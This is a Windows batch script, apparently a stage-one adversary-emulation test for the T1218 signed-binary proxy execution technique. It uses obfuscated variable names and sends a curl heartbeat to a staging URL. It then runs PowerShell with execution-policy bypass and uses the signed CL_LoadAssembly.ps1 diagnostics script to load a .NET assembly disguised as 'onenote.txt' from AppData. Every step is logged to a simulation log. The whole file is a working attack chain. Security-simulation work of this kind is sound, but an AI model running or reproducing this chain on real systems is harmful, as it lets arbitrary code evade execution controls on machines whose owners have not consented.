@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\8090\364df044
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8090-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=onenote.txt
SET ewjmdkff=8090

SET yjvwh=%APPDATA%\%pudaazx%
SET iihcw=%yjvwh%\macula-simulations.log
SET vsyhzq=CL_LoadAssembly.ps1
SET jkwat=0
SET iygea=

IF NOT EXIST "%yjvwh%" (
    echo [%DATE% %TIME%][DEBUG][%hlbnp%]: mkdir=%yjvwh%>> "%iihcw%" 2>nul
    mkdir "%yjvwh%" 2>nul
)

echo [%DATE% %TIME%][DEBUG][%hlbnp%]: script_start=Stage1_BAT_T1218>> "%iihcw%" 2>nul

echo [%DATE% %TIME%][DEBUG][%hlbnp%]: heartbeat_start=%drguvr%>> "%iihcw%" 2>nul
curl -k -s -o nul "%drguvr%"
IF !ERRORLEVEL! EQU 0 (
    echo [%DATE% %TIME%][DEBUG][%hlbnp%]: heartbeat_complete=success>> "%iihcw%" 2>nul
) ELSE (
    echo [%DATE% %TIME%][DEBUG][%hlbnp%]: heartbeat_complete=failed>> "%iihcw%" 2>nul
)

echo [%DATE% %TIME%][DEBUG][%hlbnp%]: chdir=C:\Windows\diagnostics\system\Audio>> "%iihcw%" 2>nul
cd /d "C:\Windows\diagnostics\system\Audio" 2>nul

echo [%DATE% %TIME%][DEBUG][%hlbnp%]: assembly_load_start=%pjkcpgw%\%syjfr%>> "%iihcw%" 2>nul
powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\%vsyhzq%; LoadAssemblyFromPath '%pjkcpgw%\%syjfr%';[Program]::Dale()"
IF !ERRORLEVEL! EQU 0 (
    SET jkwat=1
    SET iygea=
    echo [%DATE% %TIME%][DEBUG][%hlbnp%]: assembly_load_complete=success>> "%iihcw%" 2>nul
) ELSE (
    SET jkwat=0
    SET iygea=assembly_load_failed
    echo [%DATE% %TIME%][DEBUG][%hlbnp%]: assembly_load_complete=failed>> "%iihcw%" 2>nul
)

SET gkmewr=%DATE:~-4%-%DATE:~4,2%-%DATE:~7,2%
SET bqboq=%TIME: =0%
SET izvze=%gkmewr% %bqboq:~0,8%.%bqboq:~9,3%
(
    echo [!izvze!][%hlbnp%]: %pudaazx%-%ewjmdkff%-T1218^|Signed Binary Proxy Execution=!jkwat!:!iygea!
) >> "%iihcw%" 2>nul || >nul

echo [%DATE% %TIME%][DEBUG][%hlbnp%]: script_end=completed>> "%iihcw%" 2>nul